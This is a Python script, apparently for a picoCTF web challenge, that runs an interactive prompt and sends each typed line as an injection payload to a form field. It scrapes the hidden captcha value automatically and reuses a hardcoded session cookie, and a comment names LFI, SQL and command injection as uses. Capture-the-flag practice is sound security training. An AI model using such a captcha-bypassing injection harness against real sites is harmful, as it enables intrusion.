import requests
from bs4 import BeautifulSoup
from cmd import Cmd

# skeleton untuk looping command  
class Terminal(Cmd):
    prompt = "Command: "


    def __init__(self):
        self.mulai_initialisasi()
        super().__init__()

    # Di Panggil Pada Saat Initialisasi skeleton
    def mulai_initialisasi(self):
        # modif function ini untuk initialisasi jika ada
        print("Modify di sini untuk LFI atau SQLI atau Command Injection") 

    def default(self, args):
        payload = args
        sess = requests.session()

        url = "http://wily-courier.picoctf.net:51717/"
        cookies = {"PHPSESSID":"1e518878090e27cc09518312a91b3c83"}
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", 
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
                   "Content-Type": "application/x-www-form-urlencoded", 
                   "Origin": "http://wily-courier.picoctf.net:51717", 
                   "Connection": "keep-alive", 
                   "Referer": "http://wily-courier.picoctf.net:51717/index.php", 
                   "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
        r = sess.get(url, headers=headers, cookies=cookies)
        soup = BeautifulSoup(r.text,"html.parser")
        captcha = soup.find("input", type="hidden", id="captcha")
        url = "http://wily-courier.picoctf.net:51717/contribute.php"
        cookies = {"PHPSESSID":"1e518878090e27cc09518312a91b3c83"}
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", 
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
                    "Content-Type": "application/x-www-form-urlencoded", 
                    "Origin": "http://wily-courier.picoctf.net:51717", "Connection": "keep-alive", 
                    "Referer": "http://wily-courier.picoctf.net:51717/index.php", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
        data = {"captcha": f"{captcha['value']}", "moneys": f"{payload}"}
        r = sess.post(url, headers=headers, cookies=cookies, data=data)
        soup = BeautifulSoup(r.text, "html.parser")

        print(soup.find('h6'))

    def do_exit(self, args):
        print(f"[+] Terminal di tutup ~ aka : Lodwig")
        return True

console = Terminal()
console.cmdloop()

